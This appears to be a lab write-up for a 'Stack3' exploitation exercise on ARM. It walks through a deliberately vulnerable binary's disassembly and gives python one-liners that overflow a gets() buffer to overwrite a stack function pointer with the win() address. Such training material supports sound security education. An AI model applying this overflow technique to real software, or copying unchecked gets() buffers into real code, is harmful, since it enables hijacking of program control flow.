# Stack3
```
What you will learn

    Environment variables and how they can be set
    How to overwrite function pointers stored on the stack
    How to overwrite the saved PC

Goal: change the code flow by accessing the win() function
```

Here is the assembly of the executable:
```asm
0001047c <win>:
   1047c:	e92d4800 	push	{fp, lr}
   10480:	e28db004 	add	fp, sp, #4
   10484:	e59f0004 	ldr	r0, [pc, #4]	; 10490 <win+0x14>
   10488:	ebffffa5 	bl	10324 <puts@plt>
   1048c:	e8bd8800 	pop	{fp, pc}
   10490:	00010560 	andeq	r0, r1, r0, ror #10

00010494 <main>:
   10494:	e92d4800 	push	{fp, lr}
   10498:	e28db004 	add	fp, sp, #4
   ; ===========================================
   ; Preparing the stack for the local variables
   ; ===========================================
   1049c:	e24dd050 	sub	sp, sp, #80	; 0x50
   104a0:	e50b0050 	str	r0, [fp, #-80]	; 0xffffffb0
   104a4:	e50b1054 	str	r1, [fp, #-84]	; 0xffffffac
   104a8:	e3a03000 	mov	r3, #0
   104ac:	e50b3008 	str	r3, [fp, #-8]
   
   ; ===========================================
   ; Getting user input and store it in a buffer
   ; ===========================================
   104b0:	e24b3048 	sub	r3, fp, #72	; 0x48
   104b4:	e1a00003 	mov	r0, r3
   104b8:	ebffff96 	bl	10318 <gets@plt>
   
   ; ===========================================
   ; Loading a function pointer and calling it
   ; ===========================================
   104bc:	e51b3008 	ldr	r3, [fp, #-8]
   104c0:	e3530000 	cmp	r3, #0
   104c4:	0a000004 	beq	104dc <main+0x48>
   104c8:	e59f0018 	ldr	r0, [pc, #24]	; 104e8 <main+0x54>
   104cc:	e51b1008 	ldr	r1, [fp, #-8]
   104d0:	ebffff8d 	bl	1030c <printf@plt>
   104d4:	e51b3008 	ldr	r3, [fp, #-8]
   104d8:	e12fff33 	blx	r3
   104dc:	e1a00003 	mov	r0, r3
   
   104e0:	e24bd004 	sub	sp, fp, #4
   104e4:	e8bd8800 	pop	{fp, pc}
```

There is a buffer (with 64 bytes at most) and a function pointer (which get called) in _fp-72_ and _fp-8_ respectively.<br>
So basically, we'll need to write 64 bytes into the buffer and then the next 4 bytes will need to be the **win** function's address.<br>
Let's check the hypothesis:
```sh
$ python -c "print 'A'*68" | ./stack3 
calling function pointer, jumping to 0x41414141
Segmentation fault
```
Awesome! We are able to control the function pointer.<br>
Now let's write to it the **win** address, 0x1047c:
```sh
$ python -c "print 'A'*64 + '\x7c\x04\x01\x00'" | ./stack3 
calling function pointer, jumping to 0x0001047c
code flow successfully changed
```
